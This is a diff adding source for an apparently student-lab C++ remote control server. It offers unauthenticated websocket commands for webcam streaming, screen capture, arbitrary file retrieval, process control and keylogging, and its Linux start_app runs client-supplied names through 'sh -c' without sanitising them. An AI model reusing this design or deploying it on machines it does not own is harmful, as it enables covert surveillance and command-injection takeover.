@@ -1,0 +1,4596 @@
+// ==========================================
+// FILE: main.cpp (Cross-Platform Version)
+// ==========================================
+
+// 1. Cấu hình định nghĩa cho Windows (Phải đặt trên cùng)
+#ifdef _WIN32
+    #ifndef WIN32_LEAN_AND_MEAN
+    #define WIN32_LEAN_AND_MEAN // Giảm kích thước header Windows
+    #endif
+    #include <windows.h>      
+#else
+    #include <unistd.h>
+    #include <limits.h>
+    #include <netdb.h>        // Cho gethostname trên Linux
+    #include <arpa/inet.h>    // Cho inet_ntoa
+#endif
+
+// 2. Các thư viện C++ chuẩn và Boost
+#include <boost/beast/core.hpp>
+#include <boost/beast/websocket.hpp>
+#include <boost/asio/ip/tcp.hpp>
+#include <boost/asio/ip/udp.hpp> 
+#include <boost/asio/ip/host_name.hpp>
+#include <iostream>
+#include <string>
+#include <thread>
+#include <mutex>
+#include <vector>
+#include <algorithm>
+#include <nlohmann/json.hpp>
+
+// 3. Include các module của dự án
+#include "core/CommandDispatcher.hpp"
+#include "interfaces/IRemoteModule.hpp"
+#include "modules/KeyManager.hpp"
+#include "modules/WebcamManager.hpp"
+#include "modules/ScreenManager.hpp" 
+#include "modules/ProcessManager.hpp"
+#include "modules/FileManager.hpp"
+
+#include <boost/beast/http.hpp>
+#include <chrono>
+
+namespace beast     = boost::beast;
+namespace websocket = beast::websocket;
+namespace net       = boost::asio;
+using tcp           = net::ip::tcp;
+using udp           = net::ip::udp;
+using json          = nlohmann::json;
+namespace http      = boost::beast::http;
+
+// ==================== GLOBALS ====================
+static std::mutex cout_mtx;
+KeyManager keyManager;
+CommandDispatcher g_dispatcher;
+
+// Adapter cho KeyManager
+class KeyManagerAdapter : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override { 
+        static const std::string name = "KEYBOARD"; return name; 
+    }
+    json handle_command(const json& request) override { return keyManager.handle_command(request); }
+};
+
+// ==================== HELPER FUNCTIONS (Đa nền tảng) ====================
+
+// Hàm lấy tên máy tính
+std::string get_computer_name() {
+#ifdef _WIN32
+    char buf[256];
+    DWORD size = sizeof(buf);
+    if (GetComputerNameA(buf, &size)) {
+        return std::string(buf);
+    }
+    return "UNKNOWN-WIN-PC";
+#else
+    char hostname[HOST_NAME_MAX];
+    if (gethostname(hostname, HOST_NAME_MAX) == 0) {
+        return std::string(hostname);
+    }
+    return "UNKNOWN-LINUX-PC";
+#endif
+}
+
+// Hàm lấy IP LAN (Dùng Boost Asio để chạy trên mọi nền tảng)
+std::string get_local_ip() {
+    try {
+        net::io_context io_context;
+        udp::resolver resolver(io_context);
+        
+        // [FIX] Boost mới không dùng resolver::query nữa.
+        // Thay vào đó, truyền tham số trực tiếp vào hàm resolve().
+        auto endpoints = resolver.resolve(udp::v4(), "8.8.8.8", "80");
+        
+        if (endpoints.begin() != endpoints.end()) {
+            udp::endpoint ep = *endpoints.begin();
+            udp::socket socket(io_context);
+            socket.connect(ep);
+            return socket.local_endpoint().address().to_string();
+        }
+    } catch (...) {
+        return "127.0.0.1";
+    }
+    return "127.0.0.1";
+}
+
+// Hàm lấy tên hệ điều hành
+std::string get_os_name() {
+#ifdef _WIN32
+    return "Windows";
+#elif __linux__
+    return "Linux";
+#else
+    return "Unknown OS";
+#endif
+}
+
+// ==================== SESSION MANAGER & LOGIC ====================
+// Logic này giữ nguyên, chỉ đảm bảo include headers đúng
+
+class SessionManager {
+public:
+    void join(websocket::stream<tcp::socket>* ws) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        sessions_.push_back(ws);
+    }
+    void leave(websocket::stream<tcp::socket>* ws) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
+    }
+    void broadcast(const std::string& message) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        for (auto* ws : sessions_) {
+            try {
+                // Kiểm tra socket còn mở trước khi gửi
+                if(ws->is_open()) {
+                    ws->text(true);
+                    ws->write(net::buffer(message));
+                }
+            } catch (...) {}
+        }
+    }
+private:
+    std::vector<websocket::stream<tcp::socket>*> sessions_;
+    std::mutex mutex_;
+};
+static SessionManager g_sessionManager;
+
+void do_session(tcp::socket s) {
+    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
+    auto ws_mutex = std::make_shared<std::mutex>();
+
+    try {
+        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
+        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }
+
+        ws->accept();
+        g_sessionManager.join(ws.get());
+
+        for (;;) {
+            beast::flat_buffer buffer;
+            ws->read(buffer);
+            
+            std::string req_str = beast::buffers_to_string(buffer.data());
+            json request, response;
+
+            try {
+                request = json::parse(req_str);
+                std::string module = request.value("module", "");
+                std::string cmd = request.value("command", "");
+
+                // --- MODULE: WEBCAM ---
+                if (module == "WEBCAM") {
+                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
+                    if (cam) {
+                        if (cmd == "START_STREAM") {
+                            std::cout << "[MAIN] Webcam Stream Started\n";
+                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
+                                std::lock_guard<std::mutex> lock(*ws_mutex);
+                                try {
+                                    if(ws->is_open()) {
+                                        ws->binary(true);
+                                        ws->write(net::buffer(data.data(), data.size()));
+                                    }
+                                } catch (...) {}
+                            });
+                            response = {{"status", "success"}, {"message", "Stream Started"}};
+                        } 
+                        else if (cmd == "STOP_STREAM") {
+                            cam->stop_stream();
+                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
+                        }
+                    }
+                } 
+                // --- MODULE: SCREENSHOT ---
+                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
+                    std::vector<uint8_t> jpg_data;
+                    std::string err;
+                    
+                    bool should_save = true;
+
+                    if (request.contains("payload") && request["payload"].contains("save")) {
+                        should_save = request["payload"]["save"].get<bool>();
+                    }   
+
+                    if (ScreenManager::capture_screen_data(jpg_data, err, should_save)) {
+                        {
+                            std::lock_guard<std::mutex> lock(*ws_mutex);
+                            ws->binary(true);
+                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
+                        }
+                        // Chỉ gửi phản hồi text nếu CÓ lưu file (để đỡ spam log client)
+                        if (should_save) {
+                            response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
+                        } else {
+                            // Khi stream thì không cần gửi JSON phản hồi, chỉ gửi ảnh là đủ
+                            continue; 
+                        }
+                    } else {
+                        response = {{"status", "error"}, {"message", err}};
+                    }
+                }
+                // --- [MỚI] MODULE: FILE MANAGER ---
+                else if (module == "FILE") {
+                    if (cmd == "GET") {
+                        // Xử lý gửi file nhị phân (Binary)
+                        std::string filename = "";
+                        if (request.contains("payload") && request["payload"].contains("name")) {
+                            filename = request["payload"]["name"];
+                        }
+
+                        std::vector<uint8_t> file_data;
+                        // Gọi hàm static từ FileManager
+                        if (!filename.empty() && FileManager::read_file_binary(filename, file_data)) {
+                            {
+                                std::lock_guard<std::mutex> lock(*ws_mutex);
+                                ws->binary(true); // Chuyển sang chế độ gửi Binary
+                                ws->write(net::buffer(file_data.data(), file_data.size()));
+                            }
+                            // Thông báo JSON sau khi gửi file xong (Client có thể dùng hoặc bỏ qua)
+                            response = {{"status", "success"}, {"command", "GET_COMPLETE"}, {"file", filename}};
+                            std::cout << "[FILE] Sent: " << filename << "\n";
+                        } else {
+                            response = {{"status", "error"}, {"message", "File not found or empty name"}};
+                        }
+                    } else {
+                        // Lệnh LIST xử lý qua Dispatcher (trả về JSON)
+                        response = g_dispatcher.dispatch(request);
+                    }
+                }
+                // --- OTHER MODULES ---
+                else {
+                    response = g_dispatcher.dispatch(request);
+                }
+
+            } catch (const std::exception& e) {
+                response = {{"status", "error"}, {"message", e.what()}};
+            }
+
+            // Gửi phản hồi JSON (Text)
+            {
+                std::lock_guard<std::mutex> lock(*ws_mutex);
+                ws->text(true);
+                ws->write(net::buffer(response.dump()));
+            }
+        }
+
+    } catch (const std::exception& e) {
+        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
+        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
+            cam->stop_stream();
+        }
+    }
+    g_sessionManager.leave(ws.get());
+}
+
+// ==================== REGISTRY & DISCOVERY (UDP) ====================
+static std::string registry_host = "";
+
+std::string udp_discover_registry() {
+    try {
+        net::io_context io;
+        udp::socket socket(io);
+        socket.open(udp::v4());
+        socket.set_option(udp::socket::reuse_address(true));
+        socket.set_option(net::socket_base::broadcast(true));
+        socket.bind(udp::endpoint(udp::v4(), 0));
+
+        udp::endpoint broadcast_ep(net::ip::address_v4::broadcast(), 8888);
+        std::string msg = "DISCOVER_REGISTRY";
+        socket.send_to(net::buffer(msg), broadcast_ep);
+
+        char data[256] = {};
+        udp::endpoint sender;
+        
+        socket.non_blocking(true); 
+        
+        // Thử nhận phản hồi trong 3 giây
+        for (int i = 0; i < 30; i++) { 
+            boost::system::error_code ec;
+            size_t len = socket.receive_from(net::buffer(data), sender, 0, ec);
+            
+            if (!ec && len > 0) {
+                std::string reply(data, len);
+                if (reply.find("REGISTRY_IP:") == 0)
+                    return reply.substr(12);
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Cross-platform sleep
+        }
+    } catch (...) {}
+    return "";
+}
+
+void registerToRegistry() {
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+        auto const results = resolver.resolve(registry_host, "3000");
+        stream.connect(results);
+
+        json body = {
+            {"machineId", get_computer_name()},
+            {"ip", get_local_ip()},
+            {"os", get_os_name()},
+            {"wsPort", 9010},
+            {"tags", json::array({"lab", "student"})}
+        };
+
+        http::request<http::string_body> req{ http::verb::post, "/api/agents/register", 11 };
+        req.set(http::field::host, registry_host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body.dump();
+        req.prepare_payload();
+
+        http::write(stream, req);
+        
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+        
+        stream.socket().shutdown(tcp::socket::shutdown_both);
+        std::cout << "[REGISTRY] Registered successfully to " << registry_host << "\n";
+    } catch (const std::exception& e) {
+        std::cout << "[REGISTRY] Register ERROR: " << e.what() << "\n";
+    }
+}
+
+void sendHeartbeat() {
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+        auto const results = resolver.resolve(registry_host, "3000");
+        stream.connect(results);
+
+        json body = { {"machineId", get_computer_name()} };
+
+        http::request<http::string_body> req{ http::verb::post, "/api/agents/heartbeat", 11 };
+        req.set(http::field::host, registry_host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body.dump();
+        req.prepare_payload();
+
+        http::write(stream, req);
+        
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+        
+        stream.socket().shutdown(tcp::socket::shutdown_both);
+    } catch (...) {}
+}
+
+// ==================== MAIN ====================
+int main() {
+    // [MỚI] Fix lỗi lệch chuột trên màn hình High DPI
+    #ifdef _WIN32
+        SetProcessDPIAware(); 
+    #endif
+
+    // Chỉ set font console trên Windows
+    #ifdef _WIN32
+    SetConsoleOutputCP(CP_UTF8);
+    #endif
+
+    std::cout << "=== REMOTE SERVER [" << get_os_name() << "] ===\n";
+
+    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
+    
+    // Keylogger Callback
+    KeyManager::set_callback([&](std::string key_char) {
+        json msg; 
+        msg["module"] = "KEYBOARD"; 
+        msg["command"] = "PRESS"; 
+        msg["data"] = { {"key", key_char} };
+        g_sessionManager.broadcast(msg.dump());
+    });
+
+    // 1. Tìm Registry Server
+    std::cout << "[DISCOVERY] Searching for Registry...\n";
+    registry_host = udp_discover_registry();
+
+    if (registry_host.empty()) {
+        std::cout << "[WARN] Registry NOT found. Standalone mode.\n";
+    } else {
+        std::cout << "[INFO] Found Registry at: " << registry_host << "\n";
+        registerToRegistry();
+        
+        // Tạo thread heartbeat
+        std::thread([]() {
+            while (true) {
+                sendHeartbeat();
+                std::this_thread::sleep_for(std::chrono::seconds(10));
+            }
+        }).detach();
+    }
+
+    // 2. Mở Server WebSocket
+    try {
+        net::io_context ioc{1};
+        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
+        std::cout << "[SERVER] Listening on port 9010...\n";
+
+        for (;;) {
+            tcp::socket socket{ioc};
+            acceptor.accept(socket);
+            std::thread(do_session, std::move(socket)).detach();
+        }
+    } catch (const std::exception& e) {
+        std::cerr << "[FATAL] " << e.what() << "\n";
+    }
+    return 0;
+}
+
+
+
+-- 
+# cmake_minimum_required(VERSION 3.10)
+# project(RemoteControlTool LANGUAGES CXX)
+
+# set(CMAKE_CXX_STANDARD 17)
+# set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+# # --- [THÊM DÒNG NÀY] Bắt buộc để CMake tìm file .lib tĩnh ---
+# set(Boost_USE_STATIC_LIBS ON)
+
+# # Tắt cảnh báo về các hàm C cũ (localtime, strcpy...)
+# add_compile_definitions(_CRT_SECURE_NO_WARNINGS)
+# # --- TÌM THƯ VIỆN CHUNG ---
+# find_package(Boost REQUIRED COMPONENTS system)
+# find_package(nlohmann_json CONFIG REQUIRED)
+
+# # --- CẤU HÌNH CỤ THỂ TỪNG OS ---
+
+# if(WIN32)
+#     message(STATUS "Build target: WINDOWS")
+#     add_compile_definitions(WIN32_LEAN_AND_MEAN)
+    
+#     # Ép Static Runtime để dễ đem file exe đi máy khác
+#     if(MSVC)
+#         set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
+#         add_compile_options(/MT$<$<CONFIG:Debug>:d>)
+#     endif()
+
+#     set(OS_SRCS
+#         src/modules/ProcessManager_win.cpp
+#         src/modules/SystemManager_win.cpp
+#         src/modules/ScreenManager_win.cpp
+#         src/modules/AppManager_win.cpp
+#         src/modules/KeyManager_win.cpp
+#         src/modules/WebcamManager_win.cpp
+#         src/modules/FileManager_win.cpp
+#         src/modules/InputManager_win.cpp
+#     )
+    
+#     set(OS_LIBS ws2_32 user32 advapi32 shlwapi ole32 mf mfplat mfreadwrite mfuuid gdiplus)
+
+# elseif(UNIX AND NOT APPLE)
+#     message(STATUS "Build target: LINUX")
+    
+#     set(OS_SRCS
+#         src/modules/ProcessManager_linux.cpp
+#         src/modules/SystemManager_linux.cpp
+#         src/modules/ScreenManager_linux.cpp
+#         src/modules/AppManager_linux.cpp
+#         src/modules/KeyManager_linux.cpp
+#         src/modules/WebcamManager_linux.cpp
+#     )
+    
+#     # Linux cần pthread cho thread, X11 cho chụp màn hình, jpeg cho nén ảnh
+#     set(OS_LIBS 
+#         pthread 
+#         X11 
+#         jpeg
+#     )
+# endif()
+
+# # --- TẠO EXECUTABLE ---
+# add_executable(server 
+#     main.cpp 
+#     ${OS_SRCS}
+# )
+
+# target_include_directories(server PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/src)
+
+# target_link_libraries(server PRIVATE 
+#     Boost::system 
+#     nlohmann_json::nlohmann_json 
+#     ${OS_LIBS}
+# )
+
+cmake_minimum_required(VERSION 3.10)
+project(RemoteControlTool LANGUAGES CXX)
+
+set(CMAKE_CXX_STANDARD 17)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+# Tìm nlohmann_json trước (thư viện header-only thường dễ tìm)
+find_package(nlohmann_json CONFIG REQUIRED)
+
+# --- CẤU HÌNH: WINDOWS ---
+if(WIN32)
+    message(STATUS "Build target: WINDOWS")
+    
+    # [WINDOWS ONLY] Dùng Static Libs để dễ đóng gói file .exe mang đi máy khác
+    set(Boost_USE_STATIC_LIBS ON)
+    
+    # Tắt cảnh báo CRT cũ chỉ có trên Windows
+    add_compile_definitions(_CRT_SECURE_NO_WARNINGS WIN32_LEAN_AND_MEAN)
+    
+    # Ép Static Runtime (MT) cho MSVC
+    if(MSVC)
+        set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
+        add_compile_options(/MT$<$<CONFIG:Debug>:d>)
+    endif()
+
+    set(OS_SRCS
+        src/modules/ProcessManager_win.cpp
+        src/modules/SystemManager_win.cpp
+        src/modules/ScreenManager_win.cpp
+        src/modules/AppManager_win.cpp
+        src/modules/KeyManager_win.cpp
+        src/modules/WebcamManager_win.cpp
+        src/modules/FileManager_win.cpp
+        src/modules/InputManager_win.cpp
+    )
+    
+    set(OS_LIBS ws2_32 user32 advapi32 shlwapi ole32 mf mfplat mfreadwrite mfuuid gdiplus)
+
+# --- CẤU HÌNH: LINUX ---
+elseif(UNIX AND NOT APPLE)
+    message(STATUS "Build target: LINUX")
+    
+    # [LINUX ONLY] Trên Linux thường dùng thư viện động (Shared) cài qua apt
+    # Nếu ép Static ON ở đây thường sẽ lỗi vì không tìm thấy file .a
+    set(Boost_USE_STATIC_LIBS OFF) 
+    
+    set(OS_SRCS
+        src/modules/ProcessManager_linux.cpp
+        src/modules/SystemManager_linux.cpp
+        src/modules/ScreenManager_linux.cpp
+        src/modules/AppManager_linux.cpp
+        src/modules/KeyManager_linux.cpp
+        src/modules/WebcamManager_linux.cpp
+        # Lưu ý: Bạn đang thiếu FileManager và InputManager phiên bản Linux
+        # Nếu chưa code xong, hãy comment tạm dòng dưới để tránh lỗi compile
+        src/modules/FileManager_linux.cpp 
+        src/modules/InputManager_linux.cpp
+    )
+    
+    # Thư viện cần thiết cho Linux
+    set(OS_LIBS 
+        pthread 
+        X11 
+        jpeg
+    )
+endif()
+
+# --- TÌM BOOST ---
+# Đặt sau khối if-else để nhận biến Boost_USE_STATIC_LIBS đúng theo từng OS
+find_package(Boost REQUIRED COMPONENTS system)
+
+# --- TẠO EXECUTABLE ---
+add_executable(server 
+    main.cpp 
+    ${OS_SRCS}
+)
+
+target_include_directories(server PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/src)
+
+target_link_libraries(server PRIVATE 
+    Boost::system 
+    nlohmann_json::nlohmann_json 
+    ${OS_LIBS}
+)
+
+--
+{
+  "version": 3,
+  "configurePresets": [
+    {
+      "name": "windows-vcpkg",
+      "displayName": "Windows (Vcpkg x64)",
+      "description": "Cấu hình cho Windows dùng Vcpkg ổ C",
+      "generator": "Visual Studio 17 2022",
+      "binaryDir": "${sourceDir}/build/win",
+      "cacheVariables": {
+        "CMAKE_TOOLCHAIN_FILE": "C:/dev/vcpkg/scripts/buildsystems/vcpkg.cmake",
+        "VCPKG_TARGET_TRIPLET": "x64-windows",
+        "CMAKE_EXPORT_COMPILE_COMMANDS": "ON"
+      },
+      "condition": {
+        "type": "equals",
+        "lhs": "${hostSystemName}",
+        "rhs": "Windows"
+      }
+    },
+    {
+      "name": "linux-default",
+      "displayName": "Linux (GCC/System Libs)",
+      "description": "Cấu hình cho Linux dùng thư viện hệ thống (apt install)",
+      "generator": "Unix Makefiles",
+      "binaryDir": "${sourceDir}/build/linux",
+      "cacheVariables": {
+        "CMAKE_BUILD_TYPE": "Debug",
+        "CMAKE_EXPORT_COMPILE_COMMANDS": "ON"
+      },
+      "condition": {
+        "type": "equals",
+        "lhs": "${hostSystemName}",
+        "rhs": "Linux"
+      }
+    }
+  ]
+}
+--
+// #pragma once
+// #include "../interfaces/IRemoteModule.hpp"
+// #include <unordered_map>
+// #include <memory>
+// #include <string>
+// #include <iostream>
+// #include "../modules/ProcessManager.hpp"
+// #include "../modules/SystemManager.hpp"
+// #include "../modules/ScreenManager.hpp"
+// #include "../modules/AppManager.hpp"
+// #include "../modules/WebcamManager.hpp"
+// #include "../modules/FileManager.hpp"
+// #include "../modules/InputManager.hpp
+
+// class CommandDispatcher {
+// private:
+//     std::unordered_map<std::string, std::unique_ptr<IRemoteModule>> modules_;
+
+// public: 
+//     CommandDispatcher() {
+//         register_module(std::make_unique<ProcessManager>());
+//         register_module(std::make_unique<SystemManager>());
+//         register_module(std::make_unique<ScreenManager>());
+//         register_module(std::make_unique<AppManager>());
+//         register_module(std::make_unique<WebcamManager>());
+//         register_module(std::make_unique<FileManager>());
+//         register_module(std::make_unique<InputManager>())
+//     }
+
+//     void register_module(std::unique_ptr<IRemoteModule> module) {
+//         if (!module) return;
+//         const std::string name = module->get_module_name();
+//         auto [it, inserted] = modules_.emplace(name, std::move(module));
+//         if (inserted) std::cout << "Module registered: " << name << "\n";
+//     }
+
+//     // --- MỚI: Hàm lấy Module pointer để Main ép kiểu ---
+//     IRemoteModule* get_module(const std::string& name) {
+//         auto it = modules_.find(name);
+//         if (it != modules_.end()) return it->second.get();
+//         return nullptr;
+//     }
+
+//     json dispatch(const json& request) {
+//         if (!request.contains("module")) return { {"status","error"},{"message","Missing module"} };
+        
+//         const std::string module_name = request["module"].get<std::string>();
+//         auto it = modules_.find(module_name);
+//         if (it == modules_.end()) return { {"status","error"},{"message","Unknown module"} };
+        
+//         return it->second->handle_command(request);
+//     }
+// };
+
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <unordered_map>
+#include <memory>
+#include <string>
+#include <iostream>
+#include <nlohmann/json.hpp>
+
+// Include các module
+#include "../modules/ProcessManager.hpp"
+#include "../modules/SystemManager.hpp"
+#include "../modules/ScreenManager.hpp"
+#include "../modules/AppManager.hpp"
+#include "../modules/KeyManager.hpp"
+#include "../modules/WebcamManager.hpp"
+#include "../modules/FileManager.hpp"
+#include "../modules/InputManager.hpp" // Nếu bạn đã làm phần Input Control
+
+using json = nlohmann::json;
+
+class CommandDispatcher {
+private:
+    std::unordered_map<std::string, std::unique_ptr<IRemoteModule>> modules_;
+
+public: 
+    CommandDispatcher() {
+        // Đăng ký các module
+        register_module(std::make_unique<ProcessManager>());
+        register_module(std::make_unique<SystemManager>());
+        register_module(std::make_unique<ScreenManager>());
+        register_module(std::make_unique<AppManager>());
+        register_module(std::make_unique<KeyManager>());
+        register_module(std::make_unique<WebcamManager>());
+        register_module(std::make_unique<FileManager>());
+        register_module(std::make_unique<InputManager>()); // Nếu chưa có file InputManager thì comment dòng này lại
+    }
+
+    void register_module(std::unique_ptr<IRemoteModule> module) {
+        if (!module) return;
+        const std::string name = module->get_module_name();
+        // Sửa lỗi C2001: Đảm bảo chuỗi không bị xuống dòng
+        std::cout << "[INIT] Module registered: " << name << "\n";
+        modules_.emplace(name, std::move(module));
+    }
+
+    // Hàm lấy module pointer (Để main gọi trực tiếp các hàm đặc biệt như Start Stream)
+    IRemoteModule* get_module(const std::string& name) {
+        auto it = modules_.find(name);
+        if (it != modules_.end()) return it->second.get();
+        return nullptr;
+    }
+
+    json dispatch(const json& request) {
+        if (!request.contains("module")) return { {"status","error"},{"message","Missing module"} };
+        
+        // Sửa lỗi lấy string an toàn
+        std::string module_name = request.value("module", "");
+        
+        auto it = modules_.find(module_name);
+        if (it == modules_.end()) return { {"status","error"},{"message","Unknown module"} };
+        
+        return it->second->handle_command(request);
+    }
+};
+--
+// src/interfaces/IRemoteModule.hpp
+#pragma once
+#include <nlohmann/json.hpp>
+#include <string>
+
+using json = nlohmann::json;
+
+class IRemoteModule {
+public:
+    virtual ~IRemoteModule() = default;
+    
+    // Phương thức xử lý lệnh: nhận JSON, xử lý, trả về JSON kết quả
+    virtual json handle_command(const json& request) = 0;
+    
+    // Tên Module để Dispatcher phân loại (VD: "PROCESS")
+    virtual const std::string& get_module_name() const = 0;
+};
+--
+#include "AppManager.hpp"
+
+static std::string to_lower(std::string s) {
+    std::transform(s.begin(), s.end(), s.begin(),
+                   [](unsigned char c){ return std::tolower(c); });
+    return s;
+}
+
+json AppManager::list_apps() {
+    json app_list = json::array();
+
+    DIR* proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        return {
+            {"status", "error"},
+            {"module", get_module_name()},
+            {"command", "LIST"},
+            {"error", "Could not open /proc directory"}
+        };
+    }
+
+    struct dirent* entry;
+    while ((entry = readdir(proc_dir)) != NULL) {
+        
+        if (entry->d_type != DT_DIR) {
+            continue;
+        }
+
+        const char* d_name = entry->d_name;
+        bool is_pid = true;
+        if (*d_name == '\0') is_pid = false; // Tên rỗng
+
+        while (*d_name) {
+            if (!std::isdigit(*d_name)) {
+                is_pid = false;
+                break;
+            }
+            d_name++;
+        }
+
+        if (is_pid) {
+            std::string pid_str(entry->d_name);
+            unsigned long pid = 0;
+            unsigned long threads = 0;
+            std::string name;
+
+            try {
+                pid = std::stoul(pid_str);
+            } catch (...) {
+                continue; // Bỏ qua nếu không phải số hợp lệ
+            }
+
+            std::ifstream comm_file("/proc/" + pid_str + "/comm");
+            if (comm_file.is_open()) {
+                std::getline(comm_file, name);
+            } else {
+                continue; 
+            }
+
+            std::ifstream status_file("/proc/" + pid_str + "/status");
+            std::string line;
+            if (status_file.is_open()) {
+                while (std::getline(status_file, line)) {
+                    // Tìm dòng bắt đầu bằng "Threads:"
+                    if (line.rfind("Threads:", 0) == 0) {
+                        std::stringstream ss(line);
+                        std::string key; // Đọc chữ "Threads:"
+                        ss >> key >> threads; // Đọc số lượng luồng
+                        break;
+                    }
+                }
+            }
+
+            app_list.push_back({
+                {"pid",     pid},
+                {"name",    name} 
+                // {"threads", threads}
+            });
+        }
+    }
+
+    closedir(proc_dir);
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"command", "LIST"},
+        {"data", app_list}
+    }; 
+}
+
+json AppManager::start_app(const std::string& app_name) { // Y như tạo một tiến  trình
+    int pipe_fd[2];
+    if (pipe(pipe_fd) == -1) {
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Failed to create pipe"} 
+        };
+    }
+
+    pid_t pid = fork();
+
+    if (pid == -1) {
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Fork failed"} 
+        };
+    }
+
+    if (pid == 0) {
+        close(pipe_fd[0]); // Con không đọc, đóng đầu đọc
+        dup2(pipe_fd[1], STDOUT_FILENO); // Chuyển hướng stdout
+        close(pipe_fd[1]); // Đóng fd gốc
+
+        std::string command = app_name + " & echo $!";
+        
+        execl("/bin/sh", "sh", "-c", command.c_str(), (char*) NULL);
+        
+        _exit(errno); 
+    }
+
+    close(pipe_fd[1]); // Cha không viết, đóng đầu viết
+
+    int status;
+    waitpid(pid, &status, 0); 
+
+    std::array<char, 32> buffer;
+    std::string real_pid_str;
+    ssize_t bytes_read = read(pipe_fd[0], buffer.data(), buffer.size() - 1);
+    
+    close(pipe_fd[0]); // Đọc xong, đóng đầu đọc
+
+    unsigned long real_pid = 0;
+
+    if (bytes_read > 0) {
+        buffer[bytes_read] = '\0'; // Đảm bảo kết thúc chuỗi
+        real_pid_str = buffer.data();
+        
+        real_pid_str.erase(
+            std::remove(real_pid_str.begin(), real_pid_str.end(), '\n'), 
+            real_pid_str.end()
+        );
+
+        try {
+            real_pid = std::stoul(real_pid_str);
+        } catch (...) {
+             return {
+                {"status", "error"}, 
+                {"module", get_module_name()}, 
+                {"action", "START"},
+                {"error", "Failed to parse PID from child"}
+            };
+        }
+    } else {
+         return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Child process returned no PID"}
+        };
+    }
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"action", "START"},
+        {"data", app_name}
+    };
+
+}
+
+// json AppManager::kill_app_by_name(const std::string& app_name) {
+// // Ngăn chặn các cuộc tấn công "command injection" cơ bản
+//     // Chỉ cho phép tên ứng dụng an toàn (chữ, số, dấu gạch ngang)
+//     std::string search_term = to_lower(app_name);
+//     if (search_term.empty() || search_term.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-") != std::string::npos) {
+//         return {
+//             {"status", "error"},
+//             {"module", get_module_name()},
+//             {"action", "KILL"},
+//             {"error", "Invalid application name"}
+//         };
+//     }
+//
+//     // Xây dựng lệnh: pkill -9 ten_ung_dung
+//     // -9 là SIGKILL, tương đương với kill_pid_impl của chúng ta
+//     std::string command = "pkill -9 " + app_name;
+//
+//     // Gọi lệnh hệ thống
+//     int result = system(command.c_str());
+//
+//     if (result == 0) {
+//         // pkill tìm thấy và đã kill thành công
+//         return {
+//             {"status", "success"},
+//             {"module", get_module_name()},
+//             {"action", "KILL"},
+//             {"data", app_name}
+//         };
+//     }
+//     // pkill thất bại (thường là do không tìm thấy tiến trình)
+//     return {
+//         {"status", "error"},
+//         {"module", get_module_name()},
+//         {"message", "Application not found or pkill failed"},
+//         {"data", app_name}
+//     };
+// } 
+
+json AppManager::kill_app_by_name(const std::string& keyword) {
+    int killed = 0;
+    std::vector<std::string> killed_details;
+    
+    std::string search_term = to_lower(keyword);
+    if (search_term.empty()) {
+         return {
+            {"status", "error"},
+            {"module", get_module_name()},
+            {"command", "KILL"},
+            {"error", "Keyword cannot be empty"}
+        };
+    }
+
+    DIR* proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"command", "KILL"},
+            {"error", "Cannot open /proc directory"}
+        };
+    }
+
+    pid_t my_pid = getpid();
+
+    struct dirent* entry;
+    
+    while ((entry = readdir(proc_dir)) != NULL) {
+        
+        if (entry->d_type != DT_DIR) continue;
+        if (!std::isdigit(entry->d_name[0])) continue;
+
+        std::string pid_str = entry->d_name;
+        int pid = std::stoi(pid_str);
+
+        if (pid == my_pid) continue;
+
+        std::string comm_path = "/proc/" + pid_str + "/comm";
+        std::ifstream cmd_file(comm_path);
+        std::string exe_name;
+
